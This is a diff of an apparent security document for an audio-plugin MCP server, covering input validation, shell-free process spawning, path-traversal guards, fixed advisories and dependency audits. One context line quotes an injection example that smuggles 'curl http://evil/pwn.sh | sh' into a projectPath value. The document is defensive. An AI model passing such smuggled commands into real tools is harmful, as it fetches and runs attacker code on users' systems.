@@ -50,14 +50,14 @@ projectPath="https://evil.com/payload; curl http://evil/pwn.sh | sh"
 
 | Layer | What it blocks | How |
 |-------|---------------|-----|
-| **1. zod schema validation** — `index.js:40–56` | Invalid characters in `target`, `generator`, `options`, `testName`, `name`, `vendor`, `description`, `formats`, `projectPath` | A per-parameter regex (`SAFE_TARGET`, `SAFE_GENERATOR`, `SAFE_OPTIONS`, `SAFE_PATH`, …) rejects input before the handler runs. |
-| **2. `spawnSync` with argument arrays** — `index.js:155`, wrapper at `:167` | All shell injection, regardless of input | No shell is ever involved. User values become separate `argv[]` entries, so `;`, `` ` ``, `$()`, `\|` are literal characters. There is no `execSync` and no `sh -c` in the codebase (the only mention is a comment explaining why), and `eslint.config.js` now **fails the build** if `exec` or `execSync` is imported — so this invariant is machine-enforced, not just a convention. |
-| **3. `assertWithinProject()` — the boundary guard** — `index.js:75`, with `hasDotDot` at `:66` | Path traversal out of the project root | Operates on **fully resolved absolute** paths and requires the candidate to equal the root or start with `root + path.sep`. Because it resolves first, it cannot be bypassed by `..` segments, redundant separators, or by supplying an absolute path where a relative one was expected. Used by `audio_plugin_lint`'s `target` and by `checkPluginPath()` (`index.js:612`) in `audio_plugin_create`, so the create and lint write paths share one implementation and cannot drift. |
-| **3b. Config validation** — `CONFIG_SCHEMA` at `index.js:222`, `loadProjectConfig()` at `:235` | A hostile `apc-mcp.json` | `loadProjectConfig()` validates **each key independently** against `CONFIG_SCHEMA`, so one bad value degrades to its default instead of being spread blindly over the defaults. `buildDir`/`pluginsDir` must be relative and free of `..`; `validateFormats` must be an array of known formats; unknown keys are ignored. |
+| **1. zod schema validation** — `SAFE_*` and tool schemas in `index.js` | Invalid characters in `target`, `generator`, `options`, `testName`, `name`, `vendor`, `description`, `formats`, `projectPath` | A per-parameter regex (`SAFE_TARGET`, `SAFE_GENERATOR`, `SAFE_OPTIONS`, `SAFE_PATH`, …) rejects input before the handler runs. |
+| **2. `spawnSync` with argument arrays** — `spawn()` / `trySpawn()` | All shell injection, regardless of input | No shell is ever involved. User values become separate `argv[]` entries, so `;`, `` ` ``, `$()`, `\|` are literal characters. There is no `execSync` and no `sh -c` in the codebase (the only mention is a comment explaining why), and `eslint.config.js` now **fails the build** if `exec` or `execSync` is imported — so this invariant is machine-enforced, not just a convention. |
+| **3. `assertWithinProject()` — the boundary guard** | Path traversal out of the project root, including symlink redirection | Resolves the lexical path and then the nearest existing ancestor with `fs.realpathSync()`. Both must remain under the real project root. Used for lint targets, build/plugin directories and scaffold destinations. |
+| **3b. Config validation** — `CONFIG_SCHEMA`, `loadProjectConfig()` | A hostile `apc-mcp.json` | `loadProjectConfig()` validates **each key independently** against `CONFIG_SCHEMA`, so one bad value degrades to its default instead of being spread blindly over the defaults. `buildDir`/`pluginsDir` must be relative and free of `..`; `validateFormats` must be an array of known formats; unknown keys are ignored. |
 | **4. Command whitelist** *(with one documented exception)* — every `trySpawn()` call site | Arbitrary binary execution | `trySpawn()` is called with hardcoded names — `cmake`, `ctest`, `clang-format` — never with a user-supplied command. **Exception:** `audio_plugin_validate` takes its validator binary from `validateCommand` / `clapValidatorCommand` in `apc-mcp.json`. Those are constrained to `SAFE_TARGET` (`[a-zA-Z0-9_.-]+`), which contains **no path separator**, so they name a binary to be resolved via `PATH` rather than a path to execute. See residual risk. |
-| **5. `maxBuffer` + timeouts** — `index.js:156–158` and the per-call `timeout:` values | Memory exhaustion from large output | 2 MB output cap; 180 s default timeout, tightened per command (60–120 s for lint/validate, 300 s for ctest). A timeout is reported as a timeout, not as a null exit code. |
-| **6. Binary discovery without a subprocess** — `binaryOnPath()` at `index.js:102` | Injection via `which` | `binaryOnPath()` scans `PATH` with `fs.accessSync` rather than shelling out to `which`, so prerequisite checking cannot itself be an injection vector — and a missing tool is now actually reported as missing. |
-| **7. Honest failure reporting** — `registerTool()` at `index.js:626`, `isError` set at `:634` and throughout | Acting on a false premise | A tool whose underlying command failed returns `isError: true`, including cases where the command exited 0 but emitted compiler errors, and validation that could not complete because a validator was missing. This is a security property, not just UX: a model told "No formatting issues" after a failed in-place rewrite will keep going. |
+| **5. `maxBuffer` + timeouts** — process wrapper and per-call `timeout:` values | Memory exhaustion from large output | 2 MB output cap; 180 s default timeout, tightened per command (60–120 s for lint/validate, 300 s for ctest). A timeout is reported as a timeout, not as a null exit code. |
+| **6. Binary discovery without a subprocess** — `binaryOnPath()` | Injection via `which` | `binaryOnPath()` scans `PATH` with `fs.accessSync` rather than shelling out to `which`, so prerequisite checking cannot itself be an injection vector — and a missing tool is now actually reported as missing. |
+| **7. Honest failure reporting** — `registerTool()` and handler results | Acting on a false premise | A tool whose underlying command failed returns `isError: true`, including cases where the command exited 0 but emitted compiler errors or failed tests, and validation that could not complete because a validator was missing. This is a security property, not just UX: a model told "No formatting issues" after a failed in-place rewrite will keep going. |
 | **8. Dependency license gate** — `scripts/check-licenses.mjs` | Supply-chain policy drift | `npm run licenses` checks every package in `package-lock.json` against the allowlist in `license_decisions.yml`; a production dependency outside it fails CI. |
 
 ### Residual risk
@@ -89,8 +89,8 @@ write outside the project root.**
   shared with `checkPluginPath()`
 - **SEC-03 closed:** `apc-mcp.json` validated per key instead of spread unchecked
 - **SEC-02 closed:** 6 vulnerabilities in the committed lockfile (all transitive
-  via the SDK's HTTP transport) resolved by moving to `@modelcontextprotocol/sdk`
-  1.32.1 and `npm audit fix`; `npm audit` now reports 0
+  via the SDK's HTTP transport) resolved by updating `@modelcontextprotocol/sdk`.
+  A later `minimatch` development-only advisory is pinned to a patched release.
 - Prerequisite detection fixed — `findBinary()` previously returned `true`
   unconditionally, silently disabling the whole feature
 - Missing tools and timeouts now produce actionable messages instead of
@@ -101,8 +101,10 @@ write outside the project root.**
 - Dependency license gate added and wired into CI
 - Broken GitLab CI removed; CI consolidated on GitHub Actions with all actions
   pinned to commit SHAs
-- **147 tests**, including 30 negative security tests, 44 template-structure
-  tests, 13 artefact-discovery tests and 19 release/CI-invariant tests
+- End-to-end regression coverage for all seven tools, negative security cases,
+  native template structure/compilation, artefact discovery and release/CI invariants
+- **2026-11-07 follow-up:** project boundaries now resolve symlinks; Windows paths,
+  generated metadata escaping and successful-process stderr have regression tests
 
 ### 1.5.0 / 1.4.0
 
@@ -116,20 +118,18 @@ See the upgrade notice above — these versions are vulnerable to SEC-01.
 
 ## Dependency audit
 
-- `npm audit`: **0 vulnerabilities** (verified at 2.0.0)
-- Direct **runtime** dependencies: 2 — `@modelcontextprotocol/sdk` 1.32.1, `zod` 4.6.5
-- Lockfile: 162 packages — 93 runtime, 69 dev (`eslint` and its tree, added in
-  Phase 5). The license gate holds **runtime** packages to the allowlist and only
-  warns about dev ones, since dev deps are not distributed in the tarball.
+- `npm audit`: **0 vulnerabilities** (re-verified 2026-11-07)
+- Direct **runtime** dependencies: 2 — `@modelcontextprotocol/sdk` 1.32.2, `zod` 4.6.5
+- The license gate holds **runtime** packages to the allowlist and only warns
+  about dev ones, since dev deps are not distributed in the tarball.
 - `package.json` `files` is `["index.js", "templates/"]`, so no test, fixture, stub
   header or script ships
 - `engines.node`: `>=22` (Node 18 and 20 are both end of life)
 - Automated scanning: Dependabot + CodeQL on push/PR, `npm audit
   --audit-level=high`, the scaffold smoke test, ESLint and the license gate in CI.
-  **Caveat:** GitHub Actions cannot currently run at all — the account is locked
-  over a billing issue — so none of these CI jobs has executed. See `HANDOFF.md` §7.
-  `npm run check` runs the same set locally and is what `scripts/ship.mjs` requires
-  before it will tag a release.
+  GitHub Actions is operational; all CLAP, LV2 and JUCE scaffold jobs have passed
+  on real runners and gate publication. `npm run check` runs the local release
+  checks required by `scripts/ship.mjs`.
 
 ## Supply chain
 
